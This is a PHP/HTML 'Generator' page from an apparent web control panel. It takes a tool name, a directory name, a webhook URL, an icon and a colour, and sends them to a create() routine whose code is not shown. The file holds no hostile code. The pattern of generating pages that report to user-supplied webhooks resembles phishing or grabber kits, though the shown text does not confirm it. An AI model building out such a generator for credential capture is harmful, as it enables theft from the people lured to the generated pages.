<?php
include_once($_SERVER['DOCUMENT_ROOT'] . '/backend/include.php');
$hook = getHook();
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <style>
        body, html { background: rgb(24, 24, 28) !important; }
    </style>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title><?=$hook['name']?> - Create</title>
    <link href="https://<?=$_SERVER['HTTP_HOST']?>/controlPage/css/imports.css" rel="stylesheet">
    <link href="https://<?=$_SERVER['HTTP_HOST']?>/controlPage/css/config.css" rel="stylesheet">
    <link rel="stylesheet" href="https://<?=$_SERVER['HTTP_HOST']?>/controlPage/css/snackbar.css" />
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@sweetalert2/theme-dark@5/dark.css" />
    <link rel="icon" href="<?=$hook['icon']?>" type="image/png">
    <script src="https://<?=$_SERVER['HTTP_HOST']?>/controlPage/js/snackbar.js"></script>
    <style>
        .swal2-container { z-index: 20000 !important; }
    </style>
</head>

<body>
    <section id="login" name="regular" class="form">
        <div class="container h-100">
            <div class="row justify-content-center align-items-center h-100">
                <div class="col-md-10 col-lg-5">
                    <div class="login-box" data-aos="fade-up" data-aos-duration="1500">
                        <center><h2><?=$hook['name']?> Generator</h2></center>
                        <form method="post" id="login-form">
                            <div class="form-input-icon mb-3 mt-4" id="aname" >
                                <i class="fas fa-signature"></i>
                                <input class="auth-input" type="text" placeholder="Tool Name" id="name">
                            </div>
                            <div class="form-input-icon mb-3 mt-4">
                                <i class="fas fa-folder"></i>
                                <input class="auth-input" type="text" placeholder="Directory Name" id="directory" required>
                            </div>
                            <div class="form-input-icon mb-3 mt-4">
                                <i class="fas fa-gear"></i>
                                <input class="auth-input" type="text" placeholder="Webhook" id="webhook" required>
                            </div>
                            <div class="form-input-icon mb-3 mt-4" id="aicon" style="display:none;">
                                <i class="fas fa-image"></i>
                                <input class="auth-input" type="text" placeholder="Icon (Image URL)" id="icon">
                            </div>
                            <div class="form-input-icon mb-3 mt-4" id="acolor" style="display:none;">
                                <h6 style="color: white;">Choose a Color</h6>
                                <input type="color" class="auth-input" id="color">
                            </div>
                            <select id="type" class="form-control" onchange="toggle()">
                                <?php if ($hook['type'] == null): ?>
                                    <option value="normal" selected>Normal</option>
                                <?php else: ?>
                                    <option value="hook"><?=$hook['type']?></option>
                                    <option value="normal">Normal</option>
                                <?php endif; ?>
                            </select>
                            <input value="<?=$hook['directory']?>" type="text" class="auth-input" id="hookDir" name="hookDir" disabled style="display: none;">
                            <button type="button" class="button primary d-block mt-3 w-100" onclick="create(this);" style="color:black">Generate</button>
                        </form>
                    </div>
                </div>
            </div>
        </div>
        <div class="overlay-top-right"></div>
        <div class="overlay-bottom-right"></div>
        <div class="overlay-bottom-left"></div>
        <audio id="player" preload="auto">
            <source src="../../controlPage/file/song.mp3" type="audio/mp3">
        </audio>
    </section>

    <script src="https://<?=$_SERVER['HTTP_HOST']?>/controlPage/js/main.js"></script>
    <script src="https://<?=$_SERVER['HTTP_HOST']?>/controlPage/js/jquery-3.3.1.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11/dist/sweetalert2.min.js"></script>
	<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
    <script src="https://kit.fontawesome.com/44623006da.js" crossorigin="anonymous"></script>
    <script src="https://<?=$_SERVER['HTTP_HOST']?>/controlPage/js/bootstrap.js"></script>
    <script src="https://<?=$_SERVER['HTTP_HOST']?>/controlPage/js/core.js"></script>
    <script src="https://<?=$_SERVER['HTTP_HOST']?>/controlPage/js/player.js"></script>

    <script>
        function toggle() {
            var type = document.getElementById("type").value;
            var icon = document.getElementById("aicon");
            var color = document.getElementById("acolor");

            if (type === "hook") {
                icon.style.display = "block";
                color.style.display = "block";
            } else {
                icon.style.display = "none";
                color.style.display = "none";
            }
        }

        window.onload = function() {
            toggle();
        };
    </script>

    <style>
        #login .overlay-top-right {
            position: absolute;
            width: 1000px;
            height: 1005px;
            right: -420px;
            top: -750px;
            background: radial-gradient(50% 50% at 50% 50%, rgba(<?=$hook['color']?>, 0.35) 0%, rgba(<?=$hook['color']?>, 0.07) 64.58%, rgba(<?=$hook['color']?>, 0) 100%);
        }

        #login .overlay-bottom-right {
            position: absolute;
            width: 1000px;
            height: 1005px;
            right: -580px;
            top: 400px;
            background: radial-gradient(50% 50% at 50% 50%, rgba(<?=$hook['color']?>, 0.25) 0%, rgba(<?=$hook['color']?>, 0.05) 64.58%, rgba(<?=$hook['color']?>, 0) 100%);
        }

        #login .overlay-bottom-left {
            position: absolute;
            width: 1400px;
            height: 905px;
            left: -680px;
            top: 500px;
            background: radial-gradient(50% 50% at 50% 50%, rgba(<?=$hook['color']?>, 0.2) 0%, rgba(<?=$hook['color']?>, 0.06) 64.58%, rgba(<?=$hook['color']?>, 0) 100%);
        }
        
        .button {
            padding: .67rem 1.9rem;
            color: radial-gradient(50% 50% at 50% 50%, rgba(<?=$hook['color']?>, 0.2) 0%, rgba(<?=$hook['color']?>, 0.06) 64.58%, rgba(<?=$hook['color']?>, 0) 100%) !important;
            font-weight: 600;
            font-size: .85rem;
            text-decoration: none;
            font-size: .95rem;
            box-shadow: 0px 0px 20px 2px rgba(0, 0, 0, 0.02);
            transition: box-shadow .3s ease, background-color .3s ease;
            border-radius: 5px;
            border: 0;
            background-color: radial-gradient(50% 50% at 50% 50%, rgba(<?=$hook['color']?>, 0.2) 0%, rgba(<?=$hook['color']?>, 0.06) 64.58%, rgba(<?=$hook['color']?>, 0) 100%) !important;
        }
    </style>
</body>
</html>